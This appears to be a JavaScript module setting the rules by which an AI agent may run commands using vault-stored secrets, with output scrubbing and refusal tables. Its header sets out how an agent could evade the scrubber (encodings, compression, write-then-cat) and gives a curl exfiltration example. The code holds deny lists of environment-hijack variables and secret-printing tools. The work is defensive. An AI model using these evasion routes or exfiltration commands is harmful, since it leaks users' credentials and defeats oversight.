'use strict';
/**
 * A SECRET IN A COMMAND — the PURE half of `vibespace-vault run` (lane vault-run-model; design q-043 §8 + §5 P0-e — the owner
 * 2026-10-20: all five decisions as recommended). An agent never holds a stored value: it writes a REFERENCE where the value
 * goes, the hub resolves it and injects it into a child the HUB spawns, and the child's output comes back with every value —
 * and every form of it — scrubbed to `[vault:<store>/<row>/<field>]`. The door (route + the hub's spawn + the CLI + the card
 * + the audit + the lock's kill) is P0-f; this module is every RULE of it and no I/O:
 *
 *   · THE REFERENCE: `vault://<store>/<row>/<field>` — src/vault-inventory.js's `<store>:<entry>#<field>`, the row
 *     percent-encoded where it holds a character outside [A-Za-z0-9_.~:@+-]; `$VAULT{<store>/<row>/<field>}` inside a
 *     template; `$VAULT_FILE{<store>/<row>/<field>}` or `$VAULT_FILE{NAME}` (a `--file NAME=…`) in the command = the PATH of
 *     a 0600 file holding it (a path is not a secret) — `parseRef`, `scanRefs`, `renderTemplate`, `placeholderOf`. An
 *     AGENT'S OWN entry (lane vault-mint-put, design §9: `agent:<scope>/<name>` in the hub's secrets) is spelled the way
 *     `vibespace-vault mint|put` hands it out — `vault://agent:<scope>/<name>` (also `$VAULT{agent:…}`) — the same entry as
 *     `vault://secrets/agent:<scope>%2F<name>/secret`; only ITS conversation may reference it (`agentScopeOf`, lane vault-run-door).
 *   · THE INJECTION TABLE (`INJECTIONS`, `injectionOf`, `planOf`): env (`--env NAME=vault://…`, the default) → a 0600 file
 *     (`--file NAME=vault://…`, `--file NAME=@template` = `op inject`, `$VAULT_FILE{…}`) → stdin (`--stdin vault://…`: the
 *     value + a newline); a reference IN ARGV is REFUSED (`argv_refused`: /proc/<pid>/cmdline is readable by every user of
 *     the machine — lane vault-p1-secrets-off-argv's law); `--allow-argv` opens it only for a KNOWN tool marked argv-only
 *     (none today) and the plan says `argvExposed`. The agent's plain env may not name a library the tool loads, code an
 *     interpreter or shell runs first, a program the tool starts, a config it obeys, a proxy or PATH (`env_refused`); its
 *     NAMES are part of the shape.
 *   · THE REFUSAL TABLE (`TOOL_ROWS`, `refusedTool`): a tool (argv[0] resolved on the agent env's PATH, never the cwd — the
 *     door resolves, the resolved path is the shape's tool) that prints, transforms, packs or copies what it reads, records
 *     another process or wraps another tool is refused BY NAME (`tool_prints_secrets` · `tool_wraps_another`); VibeSpace's
 *     own CLIs and the agent browser reach the vault through their own doors (`tool_has_its_own_door`). A shell or an
 *     interpreter is not refused: its whole command line IS the shape, shown verbatim, never «always».
 *   · THE KNOWN TOOLS (`KNOWN_TOOLS`, §8.4): default hosts, where a tool's hosts come from (URLs, scp-like targets, an ssh
 *     target, a host flag, a registry), its subcommand words, whether it honours the proxy env (P1 vault-run-egress fences
 *     on it); a tool outside the table, or one naming no host = destination UNKNOWN (said on the card, never «always»).
 *   · THE SHAPE KEY (`shapeOf`, `shapeKeyOf`; decision ④): tool + flags (order-free) + hosts + entries + injection + the
 *     plain env (names AND values — lane vault-run-door: `PGHOST=evil` is another shape) + the templates' text + `--on`; a
 *     known tool's subcommand words belong to the tool, and so do the VALUES of its routing flags (`keyed`: ssh -o / -J /
 *     -F, curl -x / --resolve / --connect-to, git -c, rsync -e); every other positional is a CLASS (<path> <word> <number>
 *     <url> <vaultfile>) — a new file name is the same shape, a new host, flag, entry, route or subcommand is not. «always»
 *     is never offered for a shell, an interpreter, an unknown destination, a tool that runs the project's own code (npm,
 *     pip, docker), a config file the card cannot show (curl -K, ssh -F, kubectl --kubeconfig) or a program an agent could
 *     have written (`programWritable` — the door's fact).
 *   · THE VERDICT (`runVerdict`, §8.3): not set up / locked FIRST; the plan's and the tool's refusals; an entry with its own
 *     door (`OWN_DOORS`) / unknown / not opened for runs / too short to scrub; the conversation's grant; a remembered «always» for
 *     this shape; else a cluster ASKS every time (once / always / deny — the urgent card, 60 s) and a local instance asks the
 *     FIRST time a shape runs and allows it after one 允许 (`seen` — the owner's decision ②; still audited, still scrubbed).
 *   · THE SCRUBBER (`FORMS` / `FORM_ROWS` — THE ONE LIST, each form with a real tool that prints it by itself; `formsOf`,
 *     `VIEWS`, `createRunMasker`, `createMasker`, `maskText`): the value in every spelling a real producer prints becomes its
 *     placeholder. SPELLED (texts built from the value): raw; base64 (standard and URL-safe, padded or not, and the value's own
 *     characters at each of the three byte alignments it can take inside a longer base64 run: `Authorization: Basic
 *     base64(user:pass)`); percent-encoded (upper / lower hex; the encodeURIComponent, RFC 3986, path, WHATWG-form and
 *     every-byte spellings, `+` for a space); JSON-escaped (`\"`, `\/`, `\uXXXX`, the HTML-safe `<`); hex (upper / lower);
 *     UTF-16 LE / BE; base32 (RFC 4648, padded or not, either case). READ (lane vault-scrub-forms — a VIEW undoes one family
 *     of escapes and looks for every spelled form in what it reads; the placeholder replaces the span, its escapes included):
 *     quoted-printable (=XX, soft breaks); backslash escapes (\xNN, octal, \uXXXX, \u{…}, \UXXXXXXXX, \\ \' \" \n \t \r);
 *     HTML / XML entities; colour escapes (SGR / EL, `ESC(B`); line breaks (wrapped base64). ONE window per run: a run has
 *     ONE masker fed by stdout and stderr in arrival order, holding back its last (longest spelled form − 1) characters as
 *     every view reads them, plus a token not finished yet — a value split across chunks, or between the two pipes, is
 *     still caught, and chunked or whole the output is the same. The output belt (src/agent-output-belt.js) masks whole
 *     texts with the same table (`maskText`), so it keeps no window of its own.
 *     THE FLOOR: the scrubber masks a WHOLE value in a spelling, never a part of one — a fragment passes (its last four
 *     characters, half of it); a value under 8 bytes (MIN_MASK_BYTES) cannot be scrubbed without scrubbing ordinary text
 *     and is never referenced (`entry_too_short_to_mask`).
 *
 * WHAT IT IS NOT — §8.6, the three holes, said where the code is:
 *   ① the child runs as the agent's uid today: the agent can read /proc/<child>/environ and the 0600 file while it runs —
 *     hygiene and an audit boundary, NOT isolation (q-040's per-run uid closes it; the hub spawns the child, never the
 *     CLI, so the shape does not change when it lands);
 *   ② a tool can SEND the value somewhere (`curl -d @$VAULT_FILE{x} https://elsewhere`): the card shows the hosts and the
 *     whole command; the egress fence is P1 (vault-run-egress);
 *   ③ THE SCRUBBER IS A SIEVE. It reads the child's stdout and stderr and catches the value in the forms above — nothing
 *     else: what an adversary invents passes — a custom encoding, compression (gzip + base64: a compressed stream is not a
 *     spelling, its bytes depend on everything before them), encryption, a hash or an HMAC, a reversal, a case swap, the
 *     characters spaced out, a value split between the pipes with other output between its halves, two escape families on
 *     one value at once — and so does a fragment (THE FLOOR above); a value WRITTEN TO A FILE that the agent then `cat`s
 *     with its own shell never meets the scrubber at all — WRITE-THEN-CAT DEFEATS IT. The refusal table is a belt, not a proof.
 *     `run` stops ACCIDENTAL printing and a casual prompt injection; it does not stop a determined agent with a shell under
 *     the same uid — the same sentence q-040 says of per-session uids.
 *   (Not a hole, a boundary: the exit code, the duration and a file's size are never scrubbed.)
 *
 * PURE: imports only src/vault-inventory.js (the stores, the reference grammar) and src/vault-blocked.js (THE words of a
 * locked vault) — PURE → PURE. Gate: scripts/test-vault-run-model.mjs (every table + twelve mutants).
 */
const VI = require('./vault-inventory.js');
const VB = require('./vault-blocked.js');

const SCHEME = 'vault://';
const MIN_MASK_BYTES = 8;                        // a shorter value cannot be scrubbed without scrubbing ordinary text
const CMD_MAX = 4096;                            // bytes of the command line (exit run's bound)
const TEMPLATE_MAX = 65536;                      // bytes of one template (its text is part of the shape key)
const TIMEOUT_DEFAULT_S = 120;
const TIMEOUT_MAX_S = 600;
const OUTPUT_MAX_BYTES = 2 * 1024 * 1024;        // per run, the device's bound
const ASK_TTL_MS = 60000;                        // an unanswered card is refused by name (`ask_expired`, exit-proxy askOnce)
const ALWAYS_TTLS = Object.freeze({ '8h': 8 * 3600e3, '30d': 30 * 86400e3, forever: null });
const ALWAYS_DEFAULT = '30d';
const SHAPE_V = 'vr2';                           // a change of the key's spelling bumps it (every stored «always» asks again)
const SHAPE_NOTE = 'this shape = the tool + its flags + the hosts + the entries; positional arguments may change';

// ── THE WORDS (the code is the contract; the sentence is what an agent reads) ──
const WORDS = Object.freeze({
  vault_not_set_up: 'the vault is not set up on this instance — there is nothing to reference',
  vault_locked: VB.agentWords('a run waits until a person unlocks it on this instance\'s page'),
  bad_flag: 'usage: vibespace-vault run [--env NAME=vault://…] [--file NAME=vault://…|@template] [--stdin vault://…] [--allow-argv] [--on <machine>] [--timeout <s>] -- <command…>',
  bad_reference: 'a reference is vault://<store>/<row>/<field> (vibespace-vault list names the ones this conversation may use); in a template $VAULT{<store>/<row>/<field>}, in the command $VAULT_FILE{…} for a file\'s path',
  bad_env_name: 'an env name is letters, digits and _ (not starting with a digit)',
  duplicate_name: 'one NAME, one value — a name given twice is refused',
  env_refused: 'that variable would change what the tool loads, runs, obeys or reaches — refused by name',
  no_command: 'nothing to run — give the command after --',
  cmd_too_long: `the command is longer than ${CMD_MAX} bytes`,
  no_reference: 'the command references nothing in the vault — run it with your own shell',
  template_unread: 'the template was not read (the door hands its text in)',
  template_too_long: `a template is longer than ${TEMPLATE_MAX} bytes`,
  argv_refused: 'a value on the command line is visible to every user of the machine (/proc/<pid>/cmdline): pass it with --env NAME=vault://…, --file NAME=vault://… / $VAULT_FILE{…}, or --stdin vault://…',
  tool_prints_secrets: 'that tool prints, transforms, packs or copies what it reads — refused by name (a value would leave through its output or a file)',
  tool_wraps_another: 'that tool starts another one — run the tool itself (the run has its own timeout)',
  tool_has_its_own_door: 'VibeSpace\'s own CLIs and the agent browser reach the vault through their own doors',
  entry_has_its_own_door: 'that entry is never referenced by a run — it has its own door',
  entry_unknown: 'no such entry (vibespace-vault list names the ones this conversation may use)',
  entry_not_runnable: 'the user has not opened that entry for runs (⚙ System ▸ Vault…: the row\'s «Usable by agent runs», off by default) — ask them for it with its purpose: vibespace-vault request <vault://…> --for "<why>" (a question in their For you tray; nothing waits on it)',
  entry_too_short_to_mask: `that value is shorter than ${MIN_MASK_BYTES} bytes and cannot be scrubbed from the output — it is never referenced`,
  use_not_granted: 'this conversation may not use that entry — ask the user for it with its purpose: vibespace-vault request <vault://…> --for "<why>" (another conversation\'s own entry stays its own)',
  // ── THE DOOR's codes (lane vault-run-door, P0-f — src/server/vault-run-door.js) ──
  job_no_use: 'a Background Work job never runs with a stored secret — run it from the conversation itself',
  device_road_later: 'a run on a paired machine (a remote conversation, --on) is not here yet — a run starts on this instance only',
  cwd_refused: 'a run starts in the conversation\'s project folder, the temp folder or ~/Downloads — cd there first',
  tool_not_found: 'no such program on this instance\'s PATH (a bare name is never looked up in the current folder)',
  template_refused: 'a template is a regular file in the project folder, the temp folder or ~/Downloads',
  ask_pending: 'the same command shape already waits for the user\'s answer — wait for it, then run again',
  ask_denied: 'the user did not allow it — nothing ran',
  ask_expired: 'the user did not answer within 60 s — nothing ran; tell them in the chat, then run it again',
  ask_unfiled: 'the question could not be put in front of the user (For you refused it) — nothing ran; resolve your open For-you items first',
  ask_changed: 'the request changed after it was shown — nothing ran; run it again',
  caller_gone: 'the call went away while it waited — nothing ran',
  too_many_runs: 'too many runs at once — wait for one to end',
  spawn_failed: 'the program could not be started',
});
function refuse(code, extra = {}) { return { ok: false, code, words: WORDS[code] || code, ...extra }; }
const refusalOf = refuse;   // the door's refusals in the same shape (one spelling of a code and its words)

// ── THE REFERENCE ──
const ROW_KEEP = /[^\w.~:@+-]/g;
const encRow = (entry) => String(entry).replace(ROW_KEEP, (c) => encodeURIComponent(c).replace(/[!'()*]/g, (x) => '%' + x.charCodeAt(0).toString(16).toUpperCase()));
const REF_BODY = '([a-z][a-z0-9-]{0,31})/([\\w.~:@+%-]{1,720})/([\\w.:-]{1,160})';
const REF_EXACT = new RegExp(`^${REF_BODY}$`);
const REF_HEAD = new RegExp(`^vault://${REF_BODY}`);
const ENV_NAME = /^[A-Za-z_][A-Za-z0-9_]{0,127}$/;
// lane vault-run-door: an AGENT's own entry (lane vault-mint-put — src/vault.js AGENT_NS_RE: `agent:<scope>/<name>`, the
// secrets store, field `secret`) as its CLI hands it out: `vault://agent:<scope>/<name>`
const AGENT_BODY = 'agent:([A-Za-z0-9._:-]{1,128})/([A-Za-z0-9._-]{1,64})';
const AGENT_EXACT = new RegExp(`^${AGENT_BODY}$`), AGENT_HEAD = new RegExp(`^vault://${AGENT_BODY}`);
const AGENT_ENTRY = /^agent:([A-Za-z0-9._:-]{1,128})\/([A-Za-z0-9._-]{1,64})$/;
const isAgentEntry = (store, entry, field) => store === 'secrets' && field === 'secret' && AGENT_ENTRY.test(String(entry));
// lane vault-paste-request: a FREE entry (`secret:<id>` — the owner pasted it for an agent, or added it in the Vault window):
// opened for runs like a storage credential — the row's switch, a grant (the owner's paste grants the conversation that asked)
const FREE_ENTRY = /^secret:[\w.-]{1,160}$/;
const isFreeEntry = (store, entry, field) => store === 'secrets' && field === 'secret' && FREE_ENTRY.test(String(entry));
function refOf(store, entry, field) {
  const id = VI.refOf(store, entry, field);
  if (!id) return null;
  const label = isAgentEntry(store, entry, field) ? String(entry) : `${store}/${encRow(entry)}/${field}`;   // an agent's own entry: its short spelling
  return Object.freeze({ store, entry, field, id, label, ref: SCHEME + label });
}
function bodyRef(store, row, field) { let entry; try { entry = decodeURIComponent(row); } catch { return null; } return refOf(store, entry, field); }
const agentRef = (scope, name) => refOf('secrets', `agent:${scope}/${name}`, 'secret');
/** A reference's body (after `vault://`, or inside `$VAULT{…}`) → the ref | null. */
function innerRef(body) { const m = REF_EXACT.exec(body); if (m) return bodyRef(m[1], m[2], m[3]); const a = AGENT_EXACT.exec(body); return a ? agentRef(a[1], a[2]) : null; }
/** `vault://<store>/<row>/<field>` or `vault://agent:<scope>/<name>` (the whole string) → { store, entry, field, id, label, ref } | null. */
function parseRef(s) {
  return typeof s === 'string' && s.startsWith(SCHEME) ? innerRef(s.slice(SCHEME.length)) : null;
}
/** An agent's own entry → the conversation that owns it (its scope); any other reference → null. */
const agentScopeOf = (ref) => { const m = ref && ref.store === 'secrets' && ref.field === 'secret' ? AGENT_ENTRY.exec(String(ref.entry)) : null; return m ? m[1] : null; };
const placeholderOf = (ref) => `[vault:${ref && ref.label ? ref.label : String(ref || '')}]`;
/** Every reference-shaped piece of `text` → { refs: [{ …ref, at, len, form: 'url' | 'brace' | 'file', name? }], bad: [{ at, text }] }.
 *  `form` url = `vault://…`; brace = `$VAULT{…}`; file = `$VAULT_FILE{…}` (`name` set when it names a `--file NAME`). A
 *  `vault://` / `$VAULT{` / `$VAULT_FILE{` in any letter case that does not parse is BAD — never read as plain text. */
function scanRefs(text) {
  const s = String(text == null ? '' : text);
  const refs = [], bad = [];
  const re = /vault:\/\/|\$vault(_file)?\{/gi;
  let m;
  while ((m = re.exec(s))) {
    const at = m.index;
    if (m[0][0] !== '$') {
      const h = m[0] === SCHEME ? REF_HEAD.exec(s.slice(at)) : null, ha = !h && m[0] === SCHEME ? AGENT_HEAD.exec(s.slice(at)) : null;
      const r = h ? bodyRef(h[1], h[2], h[3]) : ha ? agentRef(ha[1], ha[2]) : null;
      if (ha && r) { refs.push({ ...r, at, len: ha[0].length, form: 'url' }); re.lastIndex = at + ha[0].length; continue; }
      if (r) { refs.push({ ...r, at, len: h[0].length, form: 'url' }); re.lastIndex = at + h[0].length; } else bad.push({ at, text: s.slice(at, at + 80) });
      continue;
    }
    const file = !!m[1], close = s.indexOf('}', at), inner = close < 0 ? null : s.slice(at + m[0].length, close);
    const exact = m[0] === (file ? '$VAULT_FILE{' : '$VAULT{');
    const named = exact && file && inner != null && ENV_NAME.test(inner);
    const r = exact && inner != null && !named ? innerRef(inner) : null;
    if (named) refs.push({ at, len: close + 1 - at, form: 'file', name: inner });
    else if (r) refs.push({ ...r, at, len: close + 1 - at, form: file ? 'file' : 'brace' });
    else { bad.push({ at, text: s.slice(at, at + 80) }); continue; }
    re.lastIndex = close + 1;
  }
  return { refs, bad };
}
/** A template's `$VAULT{…}` rendered with `valueOf(ref)` (the door's last step — `op inject`). */
function renderTemplate(text, valueOf) {
  const s = String(text == null ? '' : text), { refs } = scanRefs(s);
  let out = '', i = 0;
  for (const r of refs) { if (r.form !== 'brace') continue; out += s.slice(i, r.at) + String(valueOf(r.ref)); i = r.at + r.len; }
  return out + s.slice(i);
}

// ── THE INJECTION TABLE (the order is the preference) ──
const INJECTIONS = Object.freeze([
  Object.freeze({ where: 'env', flag: '--env NAME=vault://…', open: true, seen: 'the child\'s environment (/proc/<pid>/environ — its own uid)', use: 'the default: a tool that reads a token from a variable (GH_TOKEN, PGPASSWORD, AWS_SECRET_ACCESS_KEY)' }),
  Object.freeze({ where: 'file', flag: '--file NAME=vault://… · --file NAME=@template · $VAULT_FILE{…}', open: true, seen: 'a 0600 file in a 0700 run directory, shredded when the child exits', use: 'a tool that reads only a file (curl -K, .npmrc, kubeconfig, my.cnf, ssh -i)' }),
  Object.freeze({ where: 'stdin', flag: '--stdin vault://…', open: true, seen: 'the child\'s stdin (the value + a newline)', use: 'docker login --password-stdin, gh auth login --with-token' }),
  Object.freeze({ where: 'argv', flag: '--allow-argv', open: false, seen: '/proc/<pid>/cmdline — every user of the machine', use: 'refused by default; --allow-argv opens it for a known argv-only tool only (audited argvExposed, a red line on the card)' }),
]);
/** → { ok, where, argvExposed } | refusal. `row` = the tool's KNOWN_TOOLS row. */
function injectionOf(where, { allowArgv = false, row = null } = {}) {
  const r = INJECTIONS.find((x) => x.where === where);
  if (!r) return refuse('bad_flag');
  if (r.open) return { ok: true, where, argvExposed: false };
  const argvOpen = !!allowArgv && !!(row && row.argvOnly);
  return argvOpen ? { ok: true, where, argvExposed: true } : refuse('argv_refused', { why: allowArgv ? 'not an argv-only tool' : 'refused by default' });
}

// ── THE PLAIN ENV an agent may not set (a belt: its NAMES are in the shape too) ──
const ENV_HIJACK = Object.freeze([
  Object.freeze({ re: /^(?:LD_\w*|DYLD_\w*)$/, why: 'the loader would load a library into the tool' }),
  Object.freeze({ re: /^(?:NODE_OPTIONS|NODE_PATH|PYTHONSTARTUP|PYTHONPATH|PYTHONHOME|PYTHONUSERBASE|PERL5OPT|PERL5LIB|PERLLIB|RUBYOPT|RUBYLIB|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|JDK_JAVA_OPTIONS)$/, why: 'an interpreter would run other code first' }),
  Object.freeze({ re: /^(?:BASH_ENV|ENV|SHELLOPTS|BASHOPTS|PROMPT_COMMAND|PS4|IFS|ZDOTDIR|BASH_FUNC_\S*)$/, why: 'a shell would run other code first' }),
  Object.freeze({ re: /^(?:GIT_SSH|GIT_SSH_COMMAND|GIT_EXEC_PATH|GIT_ASKPASS|SSH_ASKPASS|GIT_PROXY_COMMAND|GIT_CONFIG\w*|EDITOR|VISUAL|PAGER|GIT_PAGER|GIT_EDITOR|MANPAGER|BROWSER|RSYNC_RSH|RSYNC_CONNECT_PROG)$/, why: 'the tool would start a program it names' }),
  Object.freeze({ re: /^PATH$/, why: 'the tool was resolved on the agent\'s PATH; another would change what it starts' }),
]);
const ENV_CONFIG = Object.freeze([   // a plain value pointing at the agent's own file is refused; a `--file NAME=…` the hub renders is not
  Object.freeze({ re: /^(?:KUBECONFIG|CURL_HOME|WGETRC|DOCKER_CONFIG|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|NPM_CONFIG_USERCONFIG|PIP_CONFIG_FILE|PGSERVICEFILE|PGPASSFILE|RCLONE_CONFIG|NETRC)$/i, why: 'it points the tool at a config it obeys' }),
  Object.freeze({ re: /^(?:HOME|XDG_CONFIG_HOME|XDG_DATA_HOME|XDG_CACHE_HOME)$/, why: 'it moves the home a tool reads its config from' }),   // lane vault-run-door (the security review)
  Object.freeze({ re: /^(?:https?_proxy|all_proxy|no_proxy|ftp_proxy)$/i, why: 'where a run may go is the hub\'s (vault-run-egress)' }),
]);
/** NAME → why it is refused, or null. `as` = 'plain' | 'env' (a value) | 'file' (a path the hub renders). */
function envRefusedOf(name, as = 'plain') {
  const n = String(name || '');
  const h = ENV_HIJACK.find((r) => r.re.test(n));
  if (h) return h.why;
  const c = as === 'file' ? null : ENV_CONFIG.find((r) => r.re.test(n));
  return c ? c.why : null;
}

// ── THE REFUSAL TABLE (argv[0], resolved) ──
const TOOL_ROWS = Object.freeze([
  Object.freeze({ cls: 'print', code: 'tool_prints_secrets', names: ['echo', 'printf', 'cat', 'tac', 'nl', 'tee', 'head', 'tail', 'less', 'more', 'most', 'pg', 'bat', 'batcat', 'view', 'env', 'printenv', 'export', 'set', 'declare', 'typeset', 'readonly', 'strings', 'column', 'pr', 'fmt', 'jq', 'yq', 'grep', 'egrep', 'fgrep', 'rg', 'ag', 'diff', 'cmp', 'sort', 'uniq', 'look', 'zcat', 'bzcat', 'xzcat', 'zstdcat', 'lz4cat', 'zless', 'zmore', 'vi', 'vim', 'nvim', 'nano', 'emacs', 'ed', 'ex', 'pico', 'micro'] }),
  Object.freeze({ cls: 'transform', code: 'tool_prints_secrets', names: ['xxd', 'od', 'hexdump', 'hd', 'base64', 'base32', 'basenc', 'uuencode', 'uudecode', 'rev', 'tr', 'cut', 'fold', 'paste', 'sed', 'gsed', 'awk', 'gawk', 'mawk', 'nawk', 'iconv', 'recode', 'md5sum', 'sha1sum', 'sha224sum', 'sha256sum', 'sha384sum', 'sha512sum', 'b2sum', 'cksum', 'sum', 'shasum'] }),
  Object.freeze({ cls: 'pack', code: 'tool_prints_secrets', names: ['gzip', 'gunzip', 'bzip2', 'bunzip2', 'xz', 'unxz', 'lzma', 'unlzma', 'zstd', 'unzstd', 'lz4', 'zip', 'unzip', 'tar', '7z', '7za', '7zr', 'rar', 'unrar', 'cpio', 'ar', 'pax', 'openssl', 'gpg', 'gpg2', 'age'] }),
  Object.freeze({ cls: 'copy', code: 'tool_prints_secrets', names: ['cp', 'mv', 'dd', 'install', 'ln', 'link', 'split', 'csplit'] }),
  Object.freeze({ cls: 'trace', code: 'tool_prints_secrets', names: ['strace', 'ltrace', 'gdb', 'lldb', 'perf', 'valgrind', 'bpftrace', 'script'] }),
  Object.freeze({ cls: 'wrapper', code: 'tool_wraps_another', names: ['sudo', 'doas', 'su', 'runuser', 'sg', 'newgrp', 'nice', 'ionice', 'nohup', 'timeout', 'time', 'stdbuf', 'setsid', 'xargs', 'parallel', 'watch', 'flock', 'chroot', 'unshare', 'nsenter', 'busybox', 'toybox', 'command', 'exec', 'builtin', 'eval', 'taskset', 'chrt', 'systemd-run', 'firejail', 'bwrap', 'proot', 'fakeroot'] }),
  Object.freeze({ cls: 'door', code: 'tool_has_its_own_door', names: ['agent-browser'], prefix: 'vibespace-' }),
]);
const REFUSING = TOOL_ROWS;
const SHELLS = Object.freeze(['sh', 'bash', 'zsh', 'dash', 'ksh', 'mksh', 'ash', 'fish', 'csh', 'tcsh', 'pwsh', 'powershell', 'cmd']);
const INTERPRETERS = Object.freeze(['node', 'nodejs', 'deno', 'bun', 'python', 'pypy', 'perl', 'ruby', 'php', 'lua', 'luajit', 'tclsh', 'wish', 'rscript', 'julia', 'java', 'dotnet']);   // a Mac's interpreters come with the device road (P1 vault-run-device)

// ── THE KNOWN TOOLS (§8.4 — P1 vault-run-egress fences the `proxyEnv` ones) ──
const SSH_VALUE_FLAGS = ['-b', '-c', '-D', '-E', '-e', '-F', '-I', '-i', '-J', '-L', '-l', '-m', '-O', '-o', '-p', '-P', '-Q', '-R', '-S', '-W', '-w', '-B'];
const SSH_KEYED = ['-o', '-F', '-J', '-W', '-L', '-R', '-D', '-S'];   // lane vault-run-door: where the connection goes / what it runs (ProxyCommand) — the value is the shape
// lane vault-use-grants round 3 (BLOCKER item 1 + MAJOR item 4): the argument-taking flags of each URL tool, DERIVED from
// `<tool> --help all` — so a flag's VALUE (-o out.json, --cacert ca.pem, -T file, -d data, -H header) is NEVER read as a
// positional host (round 2's dotted-positional rule stored `router.pem` as a granted host). `--url` is DELIBERATELY left
// out so a schemeless `--url evil.example` stays a positional the target reader resolves. THE SEAM: these are
// vault-agent-own r19's CURL_VALUE_FLAGS / WGET_VALUE_FLAGS / HTTPIE_VALUE_FLAGS verbatim (train-C merges to ONE grammar).
const CURL_VALUE_FLAGS = ['-A', '--user-agent', '-b', '--cookie', '-c', '--cookie-jar', '-C', '--continue-at', '-d', '--data', '--data-ascii', '--data-binary', '--data-raw', '--data-urlencode', '--json', '-D', '--dump-header', '-e', '--referer', '-E', '--cert', '--cert-type', '--key', '--key-type', '--cacert', '--capath', '--ciphers', '-F', '--form', '--form-string', '-H', '--header', '-m', '--max-time', '--connect-timeout', '-o', '--output', '--output-dir', '-r', '--range', '-T', '--upload-file', '-u', '--user', '-U', '--proxy-user', '-w', '--write-out', '-X', '--request', '-y', '--speed-time', '-Y', '--speed-limit', '-z', '--time-cond', '--retry', '--retry-delay', '--retry-max-time', '--limit-rate', '--max-filesize', '--max-redirs', '--oauth2-bearer', '--aws-sigv4', '--interface', '--local-port', '-Q', '--quote', '--stderr', '--trace', '--trace-ascii', '--pinnedpubkey', '--pass', '--proto', '--proto-redir', '--variable', '--url-query', '--netrc-file', '--hsts', '--etag-save', '--etag-compare', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc'];
const WGET_VALUE_FLAGS = ['-O', '--output-document', '-o', '--output-file', '-a', '--append-output', '-P', '--directory-prefix', '-U', '--user-agent', '--header', '--user', '--password', '--http-user', '--http-password', '--post-data', '--post-file', '--body-data', '--body-file', '--method', '-t', '--tries', '-T', '--timeout', '--load-cookies', '--save-cookies', '--ca-certificate', '--certificate', '--private-key', '-w', '--wait', '-Q', '--quota', '--limit-rate', '-l', '--level', '-A', '--accept', '-R', '--reject', '-D', '--domains', '--exclude-domains', '-e', '--execute', '-B', '--base', '--bind-address', '--config', '-i', '--input-file'];
const HTTPIE_VALUE_FLAGS = ['-a', '--auth', '-A', '--auth-type', '-o', '--output', '--session', '--session-read-only', '--cert', '--cert-key', '--cert-key-pass', '--ciphers', '--ssl', '--timeout', '--max-redirects', '--boundary', '--format-options', '-p', '--print', '-P', '--history-print', '--pretty', '-s', '--style', '--response-charset', '--response-mime', '--default-scheme', '--verify', '--raw', '--proxy'];
const KNOWN_TOOLS = Object.freeze([
  { name: 'curl', proxyEnv: true, valueFlags: ['-x', '--proxy', '--preproxy', '--proxy1.0', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config', ...CURL_VALUE_FLAGS], keyed: ['-x', '--proxy', '--preproxy', '--proxy1.0', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc'], configFlags: ['-K', '--config'] },   // round 3: --proxy1.0 routes like -x; --unix-socket / --abstract-unix-socket / --dns-servers / --alt-svc are destinations a grant can never name ⇒ opaque
  { name: 'wget', proxyEnv: true, valueFlags: WGET_VALUE_FLAGS, keyed: ['-e', '--execute'], configFlags: ['--config', '-i', '--input-file'] },   // round 3: `-e http_proxy=…` sets a proxy ⇒ opaque
  { name: 'http', aka: ['https', 'httpie'], proxyEnv: true, valueFlags: HTTPIE_VALUE_FLAGS, keyed: ['--proxy'] },
  { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'] },
  { name: 'git', sub: 1, scpLike: true, proxyEnv: true, valueFlags: ['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env'], keyed: ['-c', '--config-env'] },
  { name: 'aws', hosts: ['*.amazonaws.com'], sub: 2, proxyEnv: true, valueFlags: ['--profile', '--region', '--output'] },
  { name: 'gcloud', hosts: ['*.googleapis.com'], sub: 3, proxyEnv: true, valueFlags: ['--project', '--account', '--format', '--configuration'] },
  { name: 'az', hosts: ['management.azure.com', 'login.microsoftonline.com'], sub: 2, proxyEnv: true, valueFlags: ['--subscription', '-g', '--resource-group', '-o', '--output'] },
  { name: 'npm', hosts: ['registry.npmjs.org'], sub: 1, proxyEnv: true, runsProject: true },
  { name: 'pip', hosts: ['pypi.org', 'files.pythonhosted.org'], sub: 1, proxyEnv: true, runsProject: true },
  { name: 'docker', hosts: ['registry-1.docker.io'], sub: 1, registry: true, proxyEnv: false, runsProject: true },
  { name: 'kubectl', sub: 1, proxyEnv: true, valueFlags: ['-n', '--namespace', '--context', '--cluster', '--user', '-o', '--output', '-l', '--selector', '-f', '--filename', '-c', '--container', '--kubeconfig', '-s', '--server'], configFlags: ['--kubeconfig'] },
  { name: 'psql', hostFlags: ['-h', '--host'], hostEnv: ['PGHOST', 'PGHOSTADDR'], proxyEnv: false },
  { name: 'mysql', hostFlags: ['-h', '--host'], hostEnv: ['MYSQL_HOST'], proxyEnv: false },
  { name: 'rclone', sub: 1, proxyEnv: true },
  { name: 'ssh', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'sftp', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'scp', scpLike: true, copies: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'rsync', scpLike: true, copies: true, proxyEnv: false, valueFlags: ['-e', '--rsh'], keyed: ['-e', '--rsh'] },
].map((r) => Object.freeze({ argvOnly: false, ...r })));

/** argv[0] (and the door's resolution of it) → its lookup name: the basename, lower case, no `.exe`. */
const toolNameOf = (argv0, resolved = null) => String(resolved || argv0 || '').split(/[\\/]/).pop().toLowerCase().replace(/\.exe$/, '');
const findIn = (list, n, key = (r) => r.names) => list.find((r) => key(r).includes(n)) || list.find((r) => key(r).includes(n.replace(/[\d.]+$/, ''))) || null;
